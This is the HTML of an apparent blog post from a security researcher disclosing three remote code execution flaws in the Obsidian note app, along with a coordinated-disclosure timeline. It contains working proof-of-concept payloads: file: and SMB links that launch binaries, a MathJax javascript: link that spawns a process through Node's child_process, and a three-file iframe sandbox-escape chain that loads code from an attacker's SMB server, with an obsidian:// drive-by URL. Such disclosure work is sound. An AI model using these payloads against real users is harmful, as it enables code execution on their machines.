{"id":"2022-02-03-rce-vulnerabilities-in-obsidian-discovered","title":"RCE Vulnerabilities in Obsidian Discovered","year":"2022","created":"2022-02-03","html":"<h1 id=\"rce-vulnerabilities-in-obsidian-discovered\">RCE Vulnerabilities in Obsidian Discovered</h1>\n<ul>\n<li>Link: <a href=\"https://obsidian.md/\">https://obsidian.md/</a></li>\n<li>Version: v0.13.23 (latest at time of writing)</li>\n<li>Settings: default</li>\n<li>OS: Windows 10</li>\n</ul>\n<p>Timeline:</p>\n<ul>\n<li>03.02.2022 Asking <a href=\"mailto:&#x73;&#x75;&#x70;&#x70;&#111;&#x72;&#x74;&#64;&#x6f;&#98;&#x73;&#105;&#x64;&#x69;&#x61;&#x6e;&#x2e;&#x6d;&#100;\">&#x73;&#x75;&#x70;&#x70;&#111;&#x72;&#x74;&#64;&#x6f;&#98;&#x73;&#105;&#x64;&#x69;&#x61;&#x6e;&#x2e;&#x6d;&#100;</a> about contact for vulnerability disclosure</li>\n<li>15.02.2022 Asked again, got reply</li>\n<li>16.02.2022 Vulnerability details privately disclosed</li>\n<li>16.02.2022 Working on fixes started</li>\n<li>18.02.2022 Fixed insider version (0.13.25) released <a href=\"https://forum.obsidian.md/t/obsidian-release-v0-13-25-insider-build/32701\">https://forum.obsidian.md/t/obsidian-release-v0-13-25-insider-build/32701</a></li>\n<li>07.03.2022 Version 0.13.30 containing security fixes released</li>\n</ul>\n<h2 id=\"unsafe-link-handling-to-rce\">Unsafe Link Handling to RCE</h2>\n<p>URLs of the <code>file:</code>-protocol are passed to <code>shell.openPath</code> or <code>shell.openExternal</code>.\nThose are known dangerous functions, where additional validation is necessary in order to prevent undesirable actions like code execution, see:</p>\n<ul>\n<li><a href=\"https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html\">https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html</a></li>\n<li><a href=\"https://benjamin-altpeter.de/shell-openexternal-dangers/\">https://benjamin-altpeter.de/shell-openexternal-dangers/</a></li>\n</ul>\n<p>Affected Obsidian code:</p>\n<pre><code class=\"language-js\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">openExternalUrl</span>(<span class=\"hljs-params\">win, url</span>) </span>{\n    <span class=\"hljs-keyword\">if</span> (url.startsWith(FILE_PROTO)) {\n        url = <span class=\"hljs-built_in\">decodeURIComponent</span>(url.substr(FILE_PROTO.length));\n        url = path.normalize(url);\n        <span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">&#x27;Opening file: &#x27;</span> + url);\n        openPath(url);\n        <span class=\"hljs-keyword\">return</span>;\n    }\n\n    <span class=\"hljs-keyword\">let</span> exec = <span class=\"hljs-function\">() =&gt;</span> {\n        <span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">&#x27;Opening URL: &#x27;</span> + url);\n        shell.openExternal(url);\n    }\n\n    <span class=\"hljs-keyword\">let</span> schemeMatch = url.match(<span class=\"hljs-regexp\">/^([a-z][a-z0-9+\\-.]*):/i</span>);\n    <span class=\"hljs-keyword\">let</span> scheme = schemeMatch ? schemeMatch[<span class=\"hljs-number\">1</span>].toLowerCase() : <span class=\"hljs-string\">&#x27;&#x27;</span>;\n    <span class=\"hljs-keyword\">if</span> (scheme === <span class=\"hljs-string\">&#x27;http&#x27;</span> || scheme === <span class=\"hljs-string\">&#x27;https&#x27;</span> || scheme === <span class=\"hljs-string\">&#x27;obsidian&#x27;</span> || (settings.openSchemes &amp;&amp; settings.openSchemes[scheme])) {\n        <span class=\"hljs-keyword\">return</span> exec();\n    }\n    [...]\n</code></pre>\n<pre><code class=\"language-js\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">openPath</span>(<span class=\"hljs-params\">filepath</span>) </span>{\n    <span class=\"hljs-keyword\">if</span> (!isWin &amp;&amp; !isMac) {\n        shell.openExternal(pathToFileURL(filepath).href);\n    }\n    <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span> (shell.openPath) {\n        shell.openPath(filepath);\n    }\n    <span class=\"hljs-keyword\">else</span> {\n        <span class=\"hljs-comment\">// Deprecation since Electron 9.</span>\n        shell.openItem(filepath);\n    }\n}\n</code></pre>\n<p>This allows the execution of local files and remote binaries hosted on a SMB server when a malicious link is clicked.\nEspecially on Windows this is very dangerous.</p>\n<p>Example for a Windows machine:</p>\n<pre><code class=\"language-md\">[<span class=\"hljs-string\">local binary</span>](<span class=\"hljs-link\">file:///c:/windows/system32/calc.exe</span>)\n\n[<span class=\"hljs-string\">external binary</span>](<span class=\"hljs-link\">file:///\\\\\\\\live.sysinternals.com\\\\tools\\\\Procmon.exe</span>)\n</code></pre>\n<h2 id=\"url-sanitization-bypass-with-mathjax-to-rce\">URL Sanitization Bypass with MathJax to RCE</h2>\n<p>Obsidian supports MathJax syntax.\nMathJax contains a function <code>\\href{url}{math}</code> to create links (see: <a href=\"http://docs.mathjax.org/en/latest/input/tex/extensions/html.html\">http://docs.mathjax.org/en/latest/input/tex/extensions/html.html</a>).\nIn contrast to other possibilities in Obsidian which allow the creation of links, URLs created through this method are <em>not sanitized</em>.\nThis allows the creation of URLs with the <code>javascript:</code>-protocol.\nSince those links are rendered in the main window context of Obsidian access to all exposed features and functions is possible.</p>\n<p>The main window of the desktop application has the following settings:</p>\n<pre><code>allowRunningInsecureContent: false\nbackgroundColor: &quot;#00000000&quot;\ncontextIsolation: false\ndisableHtmlFullscreenWindowResize: false\nenablePreferredSizeMode: false\nenableRemoteModule: true\nenableWebSQL: true\nexperimentalFeatures: false\nimages: true\njavascript: true\nnativeWindowOpen: false\nnodeIntegration: true\nnodeIntegrationInSubFrames: false\nnodeIntegrationInWorker: false\noffscreen: false\nplugins: false\nsandbox: false\nspellcheck: true\ntextAreasAreResizable: true\nwebSecurity: true\nwebgl: true\nwebviewTag: false\nworldSafeExecuteJavaScript: true\n</code></pre>\n<p>As we can see <code>nodeIntegration</code> is enabled.\nFurthermore several Node API modules are exposed via preload script.\nThis means we have direct access to many dangerous functions and can easily achieve code execution when someone clicks a link.</p>\n<p>For example by adding the following MathJax created link in the notes, the calculator application on Windows will be spawned via Node.js calls:</p>\n<pre><code class=\"language-js\">$$\\href{<span class=\"hljs-attr\">javascript</span>:<span class=\"hljs-built_in\">module</span>.__proto__.require(<span class=\"hljs-string\">&quot;child_process&quot;</span>).spawnSync(<span class=\"hljs-string\">&quot;calc.exe&quot;</span>)}{JS-Url-Not-Sanitized}$$\n</code></pre>\n<h2 id=\"iframe-sandbox-bypass-and-path-traversal-to-rce\">IFrame Sandbox Bypass and Path Traversal to RCE</h2>\n<p>Obsidian allows the inclusion of external content like videos through HTML <code>iframe</code> elements.\nIn order to safeguard against potential attacks, in general HTML Elements within Obsidians Markdown files are sanitized with the <code>DOMPurify</code> library.\nFrom the minified source code we can observe that a custom <code>afterSanitizeAttributes</code> hook is used, as well as the <code>DOMPurify</code> settings as variable <code>Kg</code>:</p>\n<pre><code class=\"language-js\">DOMPurify.addHook(<span class=\"hljs-string\">&quot;afterSanitizeAttributes&quot;</span>, (<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">t</span>) </span>{\n    <span class=\"hljs-keyword\">if</span> (t <span class=\"hljs-keyword\">instanceof</span> HTMLAnchorElement &amp;&amp; (t.setAttribute(<span class=\"hljs-string\">&quot;target&quot;</span>, <span class=\"hljs-string\">&quot;_blank&quot;</span>),\n    t.setAttribute(<span class=\"hljs-string\">&quot;rel&quot;</span>, <span class=\"hljs-string\">&quot;noopener&quot;</span>)),\n    t <span class=\"hljs-keyword\">instanceof</span> HTMLIFrameElement &amp;&amp; (t.setAttribute(<span class=\"hljs-string\">&quot;sandbox&quot;</span>, <span class=\"hljs-string\">&quot;allow-forms allow-presentation allow-same-origin allow-scripts allow-modals&quot;</span>),\n    t.hasAttribute(<span class=\"hljs-string\">&quot;allow&quot;</span>))) {\n        <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">var</span> e = [], n = <span class=\"hljs-number\">0</span>, i = t.getAttribute(<span class=\"hljs-string\">&quot;allow&quot;</span>).split(<span class=\"hljs-string\">&quot;;&quot;</span>); n &lt; i.length; n++) {\n            <span class=\"hljs-keyword\">var</span> r = i[n];\n            r = r.trim().toLowerCase(),\n            Gg.hasOwnProperty(r) &amp;&amp; Gg[r] &amp;&amp; e.push(r)\n        }\n        t.setAttribute(<span class=\"hljs-string\">&quot;allow&quot;</span>, e.join(<span class=\"hljs-string\">&quot;; &quot;</span>))\n    }\n}\n));\n<span class=\"hljs-keyword\">var</span> Kg = {\n    <span class=\"hljs-attr\">ALLOW_UNKNOWN_PROTOCOLS</span>: !<span class=\"hljs-number\">0</span>,\n    <span class=\"hljs-attr\">RETURN_DOM_FRAGMENT</span>: !<span class=\"hljs-number\">0</span>,\n    <span class=\"hljs-attr\">RETURN_DOM_IMPORT</span>: !<span class=\"hljs-number\">0</span>,\n    <span class=\"hljs-attr\">FORBID_TAGS</span>: [<span class=\"hljs-string\">&quot;style&quot;</span>],\n    <span class=\"hljs-attr\">ADD_TAGS</span>: [<span class=\"hljs-string\">&quot;iframe&quot;</span>],\n    <span class=\"hljs-attr\">ADD_ATTR</span>: [<span class=\"hljs-string\">&quot;frameborder&quot;</span>, <span class=\"hljs-string\">&quot;allowfullscreen&quot;</span>, <span class=\"hljs-string\">&quot;allow&quot;</span>, <span class=\"hljs-string\">&quot;aria-label-position&quot;</span>]\n};\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">$g</span>(<span class=\"hljs-params\">t</span>) </span>{\n    <span class=\"hljs-keyword\">return</span> DOMPurify.sanitize(t, Kg)\n}\n</code></pre>\n<p>We can see that <code>iframe</code> elements are explicitly allowed and for each of them, the <code>sandbox</code> attribute is set to <code>allow-forms allow-presentation allow-same-origin allow-scripts allow-modals</code>.\nThe combination of <code>allow-same-origin</code> and <code>allow-scripts</code> is dangerous and will allow us to escape the sandbox later.\nIn the <a href=\"https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-iframe-sandbox\">HTML spec</a> one can find the following warning:</p>\n<blockquote>\n<p>Setting both the allow-scripts and allow-same-origin keywords together when the embedded page has the same origin as the page containing the iframe allows the embedded page to simply remove the sandbox attribute and then reload itself, effectively breaking out of the sandbox altogether.</p>\n</blockquote>\n<p>Furthermore, Obsidian registers a <a href=\"https://www.electronjs.org/de/docs/latest/api/protocol#protocolregisterfileprotocolscheme-handler\">&quot;file&quot;-protocol</a> which allows handling a custom URL scheme in a similar way like the standard <code>file:</code>-protocol:</p>\n<pre><code class=\"language-js\">protocol.registerFileProtocol(<span class=\"hljs-string\">&#x27;app&#x27;</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">req, callback</span>) =&gt;</span> {\n    <span class=\"hljs-keyword\">let</span> url = req.url;\n    <span class=\"hljs-comment\">// Strip query and hash components</span>\n    <span class=\"hljs-keyword\">if</span> (url.indexOf(<span class=\"hljs-string\">&#x27;?&#x27;</span>) &gt; <span class=\"hljs-number\">0</span>) {\n        url = url.substr(<span class=\"hljs-number\">0</span>, url.indexOf(<span class=\"hljs-string\">&#x27;?&#x27;</span>));\n    }\n    <span class=\"hljs-keyword\">if</span> (url.indexOf(<span class=\"hljs-string\">&#x27;#&#x27;</span>) &gt; <span class=\"hljs-number\">0</span>) {\n        url = url.substr(<span class=\"hljs-number\">0</span>, url.indexOf(<span class=\"hljs-string\">&#x27;#&#x27;</span>));\n    }\n    <span class=\"hljs-keyword\">if</span> (url.indexOf(URL_ROOT) === <span class=\"hljs-number\">0</span>) {\n        url = <span class=\"hljs-built_in\">decodeURIComponent</span>(url.substr(URL_ROOT.length));\n        url = path.join(RES_PATH, url);\n    }\n    <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span> (url.indexOf(FILE_ROOT) === <span class=\"hljs-number\">0</span>) {\n        url = <span class=\"hljs-built_in\">decodeURIComponent</span>(url.substr(FILE_ROOT.length));\n        <span class=\"hljs-keyword\">if</span> (!isWin) {\n            url = <span class=\"hljs-string\">&#x27;/&#x27;</span> + url;\n        }\n        url = path.resolve(url);\n    }\n    callback({<span class=\"hljs-attr\">path</span>: url});\n});\n</code></pre>\n<p>To be precise, there are two different types of this handler.\nURLs that start with <code>app://local/</code> and those that start with <code>app://obsidian.md/</code>.</p>\n<pre><code class=\"language-js\"><span class=\"hljs-keyword\">let</span> SCHEME = <span class=\"hljs-string\">&#x27;app&#x27;</span>;\n<span class=\"hljs-keyword\">let</span> PROTOCOL = SCHEME + <span class=\"hljs-string\">&#x27;://&#x27;</span>;\n<span class=\"hljs-keyword\">let</span> URL_ROOT = PROTOCOL + <span class=\"hljs-string\">&#x27;obsidian.md/&#x27;</span>;\n<span class=\"hljs-keyword\">let</span> FILE_ROOT = PROTOCOL + <span class=\"hljs-string\">&#x27;local/&#x27;</span>;\n</code></pre>\n<p>In both cases, the URL is decoded with <code>decodeURIComponent</code> and then the prefix is stripped.\nAfterwards they are handled slightly different as can be seen above in the <code>registerFileProtocol</code> handler.</p>\n<p>When a URL starts with <code>app://local/</code> (type <code>FILE_ROOT</code>) the Node.js filesystem function <code>path.resolve</code> is called to build the final URL.<br>If the URL starts with <code>app://obsidian.md/</code> (type <code>URL_ROOT</code>), the final URL is resolved differently:\nWith <code>path.join(RES_PATH, url)</code> the <code>RES_PATH</code> is joined together with the received URL and then normalized.\n<code>RES_PATH</code> points to the applications <a href=\"https://github.com/electron/asar\">asar</a> package located in the installation directory.\nIn my test (on a Windows machine) this was <code>C:\\Users\\testuser\\AppData\\Roaming\\obsidian\\obsidian-0.13.23.asar</code>.</p>\n<p>Some of the differences in behavior of <code>path.resolve</code> versus <code>path.join</code> can be viewed in the test cases of the Node.js source code repository:</p>\n<ul>\n<li><a href=\"https://github.com/nodejs/node/blob/master/test/parallel/test-path-join.js\">https://github.com/nodejs/node/blob/master/test/parallel/test-path-join.js</a></li>\n<li><a href=\"https://github.com/nodejs/node/blob/master/test/parallel/test-path-resolve.js\">https://github.com/nodejs/node/blob/master/test/parallel/test-path-resolve.js</a></li>\n</ul>\n<p>For our case the ability to escape the local filesystem with <code>app://local/</code> URLs (and specifically <code>path.resolve</code>) is interesting.\nFurthermore it is interesting, that the application puts the main application window in the <code>app://obsidian.md</code> origin.</p>\n<p>The exploit chain for code execution looks as follows:<br>A URL of the form <code>app://local/%5C%5Cour-smb-server.tld%5Cfolder%5Cexploit.html</code> will allow us to load files from an external SMB server or network share inside an iframe.<br>In the previously loaded <code>exploit.html</code> from the server we create another iframe in order to read the local <code>obsidian.json</code> file containing all the vault mappings of Obsidian.\nSince both our frames are in the <code>app://local/</code> origin we have access.<br>With the knowledge of the local vaults we can now create a URL starting with <code>app://obsidian.md/</code> to load a secondary <em>local file</em> <code>payload.html</code> in our initial <code>iframe</code>, changing its origin.\nThis will put <code>payload.html</code> in the same origin as the main window of the Obsidian application.\nNow we can escape the sandbox of the <code>iframe</code> and have access to the Node.js APIs which allow arbitrary code execution.</p>\n<h3 id=\"example-proof-of-concept\">Example proof of concept:</h3>\n<p>Three files need to be created and placed as instructed.</p>\n<ul>\n<li><code>exploit.md</code>: Malicious markdown file opened in Obsidian.</li>\n<li><code>exploit.html</code>: &quot;Loader&quot; file hosted on a remote server.</li>\n<li><code>payload.html</code>: Actual payload that will be executed.</li>\n</ul>\n<p><code>exploit.md</code> local note file in a vault (that was copied from some untrusted origin for example):</p>\n<pre><code class=\"language-html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">iframe</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;app://local/%5C%5Cour-smb-server.tld%5Cfolder%5Cexploit.html&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">iframe</span>&gt;</span>\n</code></pre>\n<p>The host <code>our-smb-server.tld</code> and path to the file need to be adapted to the actual location of the next file (<code>exploit.html</code>).\nNote: At least one path segment (share name) in the URL is important here or the path resolution won&#39;t be correct.\nThis file just contains the initial <code>iframe</code>-element that triggers the exploit execution.\nIt abuses the vulnerability described above to escape the local file system path with <code>app://local/</code>-URLs.</p>\n<p><code>exploit.html</code> hosted on an SMB server (or network share):</p>\n<pre><code class=\"language-html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">html</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">head</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">head</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">body</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\">\n<span class=\"hljs-keyword\">var</span> ifr = <span class=\"hljs-built_in\">document</span>.createElement(<span class=\"hljs-string\">&quot;iframe&quot;</span>);\n<span class=\"hljs-comment\">//ifr.src = &quot;app://local/..%5C%5C..%5C%5C..%5C%5CRoaming%5C%5Cobsidian%5C%5Cobsidian.json&quot;; // debug</span>\nifr.src = <span class=\"hljs-string\">&quot;app://local/..%5C%5C..%5C%5CRoaming%5C%5Cobsidian%5C%5Cobsidian.json&quot;</span>;\nifr.onload = <span class=\"hljs-function\">() =&gt;</span> {\n    <span class=\"hljs-keyword\">var</span> vaultMappings = <span class=\"hljs-built_in\">JSON</span>.parse(ifr.contentDocument.body.innerText);\n    <span class=\"hljs-built_in\">console</span>.log(vaultMappings);\n    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i <span class=\"hljs-keyword\">in</span> vaultMappings.vaults) {\n        <span class=\"hljs-keyword\">if</span> (vaultMappings.vaults[i].open) {\n            <span class=\"hljs-keyword\">let</span> url = <span class=\"hljs-string\">&quot;app://obsidian.md/..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..&quot;</span>+ vaultMappings.vaults[i].path.substr(<span class=\"hljs-number\">2</span>) +<span class=\"hljs-string\">&quot;\\\\payload.html&quot;</span>;\n            <span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">&quot;found: &quot;</span>+ url);\n            <span class=\"hljs-built_in\">window</span>.location = url;\n            <span class=\"hljs-keyword\">break</span>;\n        }\n    }\n};\n<span class=\"hljs-built_in\">document</span>.body.appendChild(ifr);\n</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">body</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">html</span>&gt;</span>\n</code></pre>\n<p>This file gets loaded inside the first iframe, which then loads <code>obsidian.json</code> in a sub-iframe.\n<code>obsidian.json</code> is used internally by the Obsidian app and contains the mappings of file system paths to different vaults.\nBoth iframes reside in the same origin (<code>app://local</code>), allowing read access.\nWe get the path to the currently opened vault where our initial iframe and the payload file (<code>payload.html</code>) resides.\nKnowing the storage locations, we can now load the payload file in the <code>app://obsidian.md</code>-origin with some path traversal and the actual file system path.\nSince our payload iframe now has the same origin as the main window we can escape the sandbox and get arbitrary code execution.</p>\n<p><code>payload.html</code> delivered within the malicious vault (alongside <code>exploit.md</code>):</p>\n<pre><code class=\"language-html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">html</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">head</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\">\n<span class=\"hljs-built_in\">window</span>.parent.module.__proto__.require(<span class=\"hljs-string\">&quot;child_process&quot;</span>).spawnSync(<span class=\"hljs-string\">&quot;calc.exe&quot;</span>)\n</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">head</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">body</span>&gt;</span>\npayload\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">body</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">html</span>&gt;</span>\n</code></pre>\n<p>The victim just needs to trigger a rendering of the <code>iframe</code> either automatically or by accessing reading mode of the <code>exploit.md</code> file.</p>\n<p>Alternatively this could be triggered by a malicious link on any website!\nObsidian registers the <code>obsidian://</code>-protocol <a href=\"https://help.obsidian.md/Advanced+topics/Using+obsidian+URI\">handler</a>, meaning any link starting with <code>obsidian://</code> will be opened in the application.\nThrough this mechanism we could create a new file with the content of the initial <code>exploit.md</code> above in the &quot;Obsidian Help&quot; vault which exists by default.\nExample: <code>obsidian://new?&amp;vault=Obsidian%20Help&amp;file=x&amp;content=%3Ciframe%20src%3D%22app%3A%2F%2Flocal%2F%255C%255Cour-smb-server.tld%255Cfolder%255Cexploit.html%22%3E%3C%2Fiframe%3E</code></p>\n<p>So this vulnerability is especially dangerous because it could be triggered in a drive-by style and not even requiring intentionally downloading and opening an untrusted vault.</p>\n<p><figure>\n\t\t\t\t<video controls=\"true\" >\n\t\t\t\t\t<source src=\"/posts/2022-02-03-rce-vulnerabilities-in-obsidian-discovered/obsidian-rce.mp4\" type=\"video/mp4\">\n\t\t\t\t</video>\n\t\t\t\t<figcaption>Video: PoC - IFrame Sandbox Bypass and Path Traversal to RCE</figcaption>\n\t\t\t</figure></p>\n<h2 id=\"conclusion\">Conclusion</h2>\n<p>The last vulnerability (&quot;IFrame Sandbox Bypass and Path Traversal to RCE&quot;) was actually very interesting to exploit as it combined several different weaknesses to achieve code execution.</p>\n<p>After the initial delay the Obsidian developers were very responsive and communication was very good. \nThey quickly started working on the fixes and soon afterwards delivered an updated version.</p>\n<hr>\n<p>Changelog:</p>\n<ul>\n<li>12.02.2022 Initial writeup</li>\n<li>26.03.2022 Minor updates</li>\n<li>14.07.2022 Published post after 3 months time for updates as coordinated</li>\n</ul>\n","lastUpdate":""}